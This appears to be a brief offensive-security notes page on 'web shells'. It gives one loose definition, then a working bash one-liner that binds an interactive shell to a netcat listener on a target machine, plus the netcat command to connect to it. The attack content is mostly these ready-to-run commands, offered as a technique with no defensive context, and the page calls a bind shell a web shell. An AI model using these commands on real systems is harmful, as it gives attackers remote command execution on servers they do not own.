---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Web Shell

Is a technique where we upload a script on the language a website is based on, that lets the app to accept commands through HTTP request parameters, and pass them to the internal system of the server to be executed by the internal shell.

## <mark style="color:orange;">Basic script</mark>

* &#x20;Use and script that establishes a listening port on the target machine

{% code title="BindShell.sh" overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $port >/tmp/f
```
{% endcode %}

* Connect to the listening port we have set using Netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc $IP $port
```
{% endcode %}
